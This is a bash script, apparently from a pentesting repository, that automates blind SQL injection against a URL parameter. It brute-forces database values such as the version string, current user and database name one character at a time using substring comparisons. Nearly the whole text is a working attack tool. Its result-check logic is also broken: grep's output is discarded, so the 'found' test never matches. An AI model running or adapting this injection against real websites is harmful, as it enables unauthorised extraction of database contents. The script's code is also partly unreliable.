#!/bin/bash
#https://github.com/Plotkine/Pentesting
#this is a script finding the n first characters of a query by performing a blind SQLi (substring technique)

#colors: white=\e[97m red=\e[91m green=\e[92m light grey=\e[37m
#fonts: normal= \033[0m bold=\033[1m

# CHECKS

#number of parameters check
if (( $#<4 || $#>4 ))
then
	echo -e "\e[92mUsage:\e[97m bash blind_sqli.sh [URL] [query] [maxlength] [truestring]" #green
	echo -e "- URL        target website, with valid PHP parameter"
	#echo -e "\e[37m- URL        = target website, with valid PHP parameter" #light grey
	echo -e "- query      DBMS field queried"
	echo -e "- maxlength  number of chars to be extracted from the query"
	echo -e "- truestring webpage output when the SQL query returns true" #\e[97m"
	echo -e ""
        echo -e "\e[92mMySQL examples:\e[97m bash blind_sqli.sh http://target.site?id=1 @@version 5 \"Image found\"" #green
	echo -e "                bash blind_sqli.sh http://target.site?id=1 \"Select user()\" 5 \"Image found\""	
	echo -e "                bash blind_sqli.sh http://target.site?id=1 \"Select database()\" 5 \"Image found\""
	exit 0
fi

#URL check
export URL=$1
wget $1 -q -T 3 &>/dev/null #trying to reach the URL within 3 seconds
		            #&>/dev/null = >/dev/null 2>&1 = redirecting STDERR and STDOUT to /dev/null
if [ "$?" != "0" ]
then
   echo -e "\e[97mError: \e[91mHost unreachable\e[97m" #red
   exit 0
else
        echo -e "\e[92mHost reachable\e[97m"
fi

# CODE

#charset
export charset=`echo {0..9} {A..z} \. \: \, \; \- \_ \@` #charset for queried field 
echo -e "\e[97mCharset: 0..9 A..z . : , ; - _ @"

#arguments
#export URL=$1 #already done in URL check
export query=$2
export maxlength=$3
export truestring=$4
export result=""

echo ""
echo -e "Getting $maxlength first chars of $query..."

for ((j=1;j<$maxlength+1;j+=1)) #j=position in the @@version string
do
	for i in $charset #testing every char of charset
	do
		export try=`wget "$URL' and substring($query,$j,1)='$i" -T 3 -q -O - |grep "$truestring" &>/dev/null` #-T 3 = timeout 3sec
		                                              #&>/dev/null = > /dev/null 2>&1 = redirecting STDERR and STDOUT to /dev/null
	        
		if [ "$try" == "$truestring" ] #found
	        then
			echo -e "substring($query,$j,1): \e[92mOK\e[97m" #green
		        export result+=$i
		        break
	        fi
        done
	if [ "$try" != "$truestring" ] #not found
	then
		echo -e "substring($query,$j,1): \e[31mFail\e[97m" #red
		break
	fi
done

# OUTPUT

if [ "$result" != "" ]
then
echo -e "Result: \e[32m$result" #green
fi
